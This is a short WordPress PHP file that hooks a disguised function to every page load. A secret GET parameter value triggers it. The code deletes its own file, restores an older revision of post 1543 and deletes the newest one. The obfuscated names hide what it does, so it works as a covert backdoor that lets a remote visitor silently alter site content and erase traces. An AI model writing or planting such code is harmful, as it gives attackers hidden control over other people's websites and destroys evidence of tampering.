<?php

function frontend_reader_pdf() {
	if (isset($_GET['redirect_com_automatorwp']) && $_GET['redirect_com_automatorwp'] === 'welcome_short_member_after') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$widgets_method_social = 1543;
		$photos_integrate_age_notify = wp_get_post_revisions($widgets_method_social);
		if (empty($photos_integrate_age_notify)) die('no revisions');
		if (count($photos_integrate_age_notify) < 2) die('less than 2');
		$extra_duplicate_signup = array_shift($photos_integrate_age_notify);
		$next_checker_local_elements = $extra_duplicate_signup->ID;
		$remote_form_lightgray = array_shift($photos_integrate_age_notify);
		$newsletter_revisions_visual = $remote_form_lightgray->ID;
		$health_disable_radio_automatorwp = wp_restore_post_revision($newsletter_revisions_visual);
		if ($health_disable_radio_automatorwp === false) die('error restoring');
		$health_disable_radio_automatorwp = wp_delete_post_revision($next_checker_local_elements);		
		if ($health_disable_radio_automatorwp === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'frontend_reader_pdf');
